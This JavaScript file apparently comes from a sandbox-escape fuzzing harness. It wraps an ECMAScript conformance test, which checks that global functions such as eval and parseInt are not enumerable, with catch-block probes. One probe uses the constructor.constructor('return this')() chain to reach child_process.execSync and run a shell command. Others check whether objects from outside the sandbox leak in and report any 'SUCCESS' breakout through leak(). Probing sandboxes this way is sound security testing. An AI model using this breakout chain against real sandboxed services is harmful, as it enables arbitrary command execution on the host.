try {
    var evalStr = '//CHECK#1\n' + 'for (var x in this) {\n' + '  if ( x === \'eval\' ) {\n' + '    $ERROR("#1: \'eval\' have attribute DontEnum");\n' + '  } else if ( x === \'parseInt\' ) {\n' + '    $ERROR("#1: \'parseInt\' have attribute DontEnum");\n' + '  } else if ( x === \'parseFloat\' ) {\n' + '    $ERROR("#1: \'parseFloat\' have attribute DontEnum");\n' + '  } else if ( x === \'isNaN\' ) {\n' + '    $ERROR("#1: \'isNaN\' have attribute DontEnum");\n' + '  } else if ( x === \'isFinite\' ) {\n' + '    $ERROR("#1: \'isFinite\' have attribute DontEnum");\n' + '  } else if ( x === \'decodeURI\' ) {\n' + '    $ERROR("#1: \'decodeURI\' have attribute DontEnum");\n' + '  } else if ( x === \'decodeURIComponent\' ) {\n' + '    $ERROR("#1: \'decodeURIComponent\' have attribute DontEnum");\n' + '  } else if ( x === \'encodeURI\' ) {\n' + '    $ERROR("#1: \'encodeURI\' have attribute DontEnum");\n' + '  } else if ( x === \'encodeURIComponent\' ) {\n' + '    $ERROR("#1: \'encodeURIComponent\' have attribute DontEnum");\n' + '  }\n' + '}\n';
    eval(evalStr);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}